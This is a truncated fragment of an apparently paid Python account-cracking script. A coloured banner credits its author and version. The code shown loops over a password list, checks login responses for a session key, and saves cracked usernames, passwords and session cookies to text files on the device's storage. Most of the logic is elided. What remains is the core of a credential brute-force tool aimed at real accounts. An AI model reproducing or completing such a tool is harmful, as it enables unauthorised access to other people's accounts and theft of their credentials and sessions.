...
\033[91;1m╔════════════════════════════════════════╗
{H}║{P}[{H}•{P}] Author    :{warna} AYUSH PRASAD JOSHI        {N}{H}║
{H}║{P}[{H}•{P}] Status    : {H}PAID {P}     {N}         {H}     ║
{H}║{P}[{H}•{P}] Version   : {H}3.0                     ║
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/AYUSH_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AYUSH_COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
